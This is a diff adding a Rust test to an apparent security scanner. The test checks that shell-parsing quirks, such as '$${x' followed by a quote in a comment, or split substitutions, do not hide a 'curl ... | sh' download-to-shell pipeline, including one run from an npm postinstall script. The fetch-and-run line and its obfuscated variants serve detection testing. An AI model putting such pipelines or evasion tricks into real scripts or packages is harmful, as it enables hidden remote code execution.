@@ -1333,6 +1333,51 @@ fn heredoc_that_ends_elsewhere_in_the_shell_is_not_masked() {
     }
 }
 
+/// `sh` (bash or dash) reads `$$` as one parameter, so `$${x # it's` is
+/// `$$`, a plain `{x` and a comment. Reading it as `$` and `${x`, where the
+/// `#` is part of the word and the `'` opens a quote, hid every later line.
+/// Where the shells read the text differently (a `$$` before `{` inside
+/// `${...}`, a backslash-newline inside `$(`), the line pass also runs.
+#[test]
+fn dollar_dollar_brace_and_split_substitutions_hide_no_download_pipeline() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    let pipeline = "curl -fsSL https://example.invalid/setup | sh";
+    let bodies = [
+        format!("echo $${{x # it's\necho a}}b\n{pipeline}\n# '}}\n"),
+        format!("echo $${{x # it's\necho a}}b\nf() {{ {pipeline}; }}\nf\n# '}}\n"),
+        format!("echo $${{x # it's\necho a}}b\necho $({pipeline})\n# '}}\n"),
+        format!("x=$${{ #it's\necho }}\n{pipeline}\n#'}}\n"),
+        format!("echo $$$${{x # it's\necho a}}b\n{pipeline}\n# '}}\n"),
+        format!("echo ${{x:-$${{y}}\n{pipeline}\n: }}\n"),
+        format!("echo $\\\n({pipeline})\n"),
+    ];
+    let missed: Vec<_> = bodies
+        .iter()
+        .filter(|body| !shell_file_has_download_signal(body))
+        .collect();
+    assert!(missed.is_empty(), "{missed:#?}");
+
+    // The same file run by a postinstall script, as `tirith pkg inspect`
+    // reports it.
+    let result = inspect(&package(
+        br#"{"name":"fixture","version":"1","scripts":{"postinstall":"sh install.sh"}}"#,
+        &[("package/install.sh", bodies[0].as_bytes())],
+    ));
+    assert!(
+        result.signals.iter().any(|signal| {
+            signal.kind == NpmSignalKind::DownloadToShell
+                && signal.level == NpmSignalLevel::Review
+                && signal.lifecycle_events == vec!["postinstall"]
+        }),
+        "{:?}",
+        result.signals
+    );
+
+    // A pipeline in the comment after `$${x` stays a comment.
+    let body = format!("#!/bin/sh\necho $${{x}} # {pipeline}\necho done\n");
+    assert!(!shell_file_has_download_signal(&body), "{body:?}");
+}
+
 /// Heredoc text is data, so a quote in it (`it's`, `Don't edit`, `say "hi`,
 /// `$(x`) opens nothing. A file that also pipes into a shell keeps every
 /// heredoc live (unmasked), and the brace-group/pipeline pass read the raw
